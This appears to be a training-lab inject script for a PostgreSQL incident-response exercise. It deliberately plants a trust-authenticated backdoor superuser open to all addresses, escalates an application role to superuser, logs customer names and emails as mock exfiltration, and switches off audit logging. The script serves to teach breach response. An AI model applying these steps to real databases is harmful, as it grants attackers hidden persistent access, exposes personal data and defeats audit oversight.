#!/usr/bin/env bash
# SUTA survive scenario: module20-capstone/04-security-breach-response
# inject.sh - breaks the server (idempotent) and prints the alert the learner sees.
# Runs ON the lab node as root (sudo bash inject.sh). Self-contained: no lib, no student.env.
set -uo pipefail
PGBIN=/usr/pgsql-16/bin; PGDATA=/opt/pgsql/data; PGPORT=5432; PGLOG=/opt/pgsql/log
STATE_DIR=/var/lib/suta-survive/module20-04; mkdir -p "$STATE_DIR"
psq() { sudo -u postgres "$PGBIN/psql" -p "$PGPORT" -d "$1" -v ON_ERROR_STOP=1 -tAXqc "$2"; }
pg_up() { sudo -u postgres "$PGBIN/pg_isready" -q -p "$PGPORT"; }
wait_up() { for _ in $(seq 1 30); do pg_up && return 0; sleep 1; done; return 1; }
say() { printf '%s\n' "$*"; }
DB=appdb; HBA="$PGDATA/pg_hba.conf"
pg_up || { systemctl start postgresql-16 >/dev/null 2>&1; wait_up; }
pg_up || { say "PostgreSQL is not running"; exit 1; }
if [[ "$(psq "$DB" "select count(*) from pg_class c join pg_namespace n on n.oid=c.relnamespace where n.nspname='app' and c.relname='customers'" 2>/dev/null)" != "1" ]] \
   || [[ "$(psq postgres "select count(*) from pg_roles where rolname='app_readwrite'")" != "1" ]]; then
  say "PRECONDITION: finish Tutorial 1 (production deployment: appdb, app.customers, app_readwrite role) first"; exit 2
fi
# record the current credential verifiers (hashed) once per fresh injection, for the rotation check
if [[ "$(psq postgres "select count(*) from pg_roles where rolname='backdoor_admin'")" == "0" ]]; then
  psq postgres "select rolname||':'||md5(coalesce(rolpassword,'')) from pg_authid where rolname in ('app_owner','app_readwrite','app_readonly','replicator') order by 1" >"$STATE_DIR/verifiers.before"
  psq postgres "CREATE ROLE backdoor_admin LOGIN SUPERUSER" >/dev/null
fi
psq "$DB" "GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA app TO backdoor_admin" >/dev/null
psq postgres "ALTER ROLE app_readwrite WITH SUPERUSER" >/dev/null
psq "$DB" "CREATE OR REPLACE FUNCTION app.exfil_data() RETURNS void LANGUAGE plpgsql AS \$f\$ DECLARE r record; BEGIN FOR r IN SELECT email, full_name FROM app.customers LIMIT 5 LOOP RAISE LOG 'EXFIL: % %', r.email, r.full_name; END LOOP; END \$f\$" >/dev/null
psq "$DB" "SELECT app.exfil_data()" >/dev/null
if ! grep -qE '^host[[:space:]]+all[[:space:]]+backdoor_admin[[:space:]]+0\.0\.0\.0/0[[:space:]]+trust' "$HBA"; then
  cp -p "$HBA" "$STATE_DIR/pg_hba.conf.before"
  sed -i '1i host    all             backdoor_admin  0.0.0.0/0               trust' "$HBA"
fi
for kv in "log_connections = 'off'" "log_disconnections = 'off'" "log_statement = 'none'" "log_min_duration_statement = -1"; do psq postgres "ALTER SYSTEM SET $kv" >/dev/null; done
psq postgres "SELECT pg_reload_conf()" >/dev/null
sleep 2
say "audit settings: log_connections=$(psq postgres 'show log_connections') log_statement=$(psq postgres 'show log_statement')"
say ""
say "ALERT: Critical - Unauthorized superuser access, data exfiltration, audit disabled."
say "The security team reports suspicious activity on appdb and gaps in the connection logs."
exit 0
